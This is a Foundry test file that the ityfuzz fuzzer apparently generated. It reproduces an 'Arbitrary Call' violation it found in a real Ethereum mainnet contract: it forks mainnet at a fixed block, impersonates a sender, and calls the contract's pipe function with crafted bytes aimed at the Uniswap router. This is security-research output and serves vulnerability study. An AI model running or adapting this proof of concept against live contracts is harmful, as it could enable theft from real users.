// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0xb1bE0000C6B3C62749b5F0c92480146452D15423 -c eth --onchain-block-number 19341533 -f -i -p --onchain-etherscan-api-key $ETH_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Arbitrary Call]: Arbitrary call from "0xb1be0000c6b3c62749b5f0c92480146452d15423" to 0x7a250d5630b4cf539739df2c5dacb4c659f2488d
================ Trace ================
[38;2;220;144;36m[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   ├─[1] [38;2;209;84;35m0xb1bE0000C6B3C62749b5F0c92480146452D15423.[38;2;255;123;114mpipe{value: [38;2;153;0;204m20688}(([38;2;242;72;141m0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 0x43424343624310434343bd43010000007f1000e6))
   │  │  └─[3] [38;2;242;72;141m0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D.[38;2;255;123;114mreceive()


 */

contract Cb1bE is Test {
    struct S0 {
        address p0;
        bytes p1;
    }

    function setUp() public {
        vm.createSelectFork("eth", 19341533);
    }

    function test() public {
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        S0 memory s00 = S0(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, hex"43424343624310434343bd43010000007f1000e6");
        I(0xb1bE0000C6B3C62749b5F0c92480146452D15423).pipe{value: 20688}(s00);
    }

    // Stepping with return
    receive() external payable {}
}

interface I {
    function pipe(S0 memory) external payable;
}
